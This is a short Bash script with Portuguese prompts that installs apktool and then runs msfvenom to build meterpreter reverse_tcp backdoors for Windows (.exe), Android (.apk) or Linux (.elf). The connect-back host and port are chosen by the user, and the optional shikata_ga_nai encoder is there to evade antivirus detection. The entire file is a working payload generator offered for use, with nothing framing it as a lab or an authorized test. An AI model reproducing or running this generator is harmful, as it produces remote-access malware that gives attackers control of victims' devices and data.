#!/bin/bash

# Função para verificar e instalar o apktool
install_apktool() {
  if ! command -v apktool &> /dev/null; then
    echo "apktool não está instalado. Instalando agora..."
    
    # Baixar o apktool
    wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool
    wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool.jar

    # Mover para /usr/local/bin e tornar executável
    sudo mv apktool /usr/local/bin
    sudo mv apktool.jar /usr/local/bin
    sudo chmod +x /usr/local/bin/apktool

    # Verificar se a instalação foi bem-sucedida
    if command -v apktool &> /dev/null; then
      echo "apktool instalado com sucesso."
    else
      echo "Falha ao instalar o apktool. Continuando sem ele..."
    fi
  else
    echo "apktool já está instalado."
  fi
}

# Instalar o apktool se necessário
install_apktool

# Prompt the user to choose the platform
echo "Escolha a plataforma do exploit:"
echo "1. Windows"
echo "2. Android"
echo "3. Linux"

read platform

echo "Escolha o LHOST:"
read lhost

echo "Escolha o LPORT:"
read lport

# Perguntar se o usuário deseja usar um encoder
echo "Deseja usar um encoder? (s/n)"
read use_encoder

# Define o encoder se o usuário escolher "s"
if [[ $use_encoder == "s" ]]; then
  encoder="-e x86/shikata_ga_nai"
else
  encoder=""
fi

case $platform in
  1)
    echo "Criando exploit Windows..."
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport $encoder -f exe > windows_exploit.exe
    ;;
  2)
    echo "Criando exploit Android..."
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport $encoder -o android_exploit.apk
    ;;
  3)
    echo "Criando exploit Linux..."
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport $encoder -f elf > linux_exploit.elf
    ;;
  *)
    echo "Plataforma inválida. Saindo..."
    exit 1
    ;;
esac

echo "Exploit criado com sucesso!"
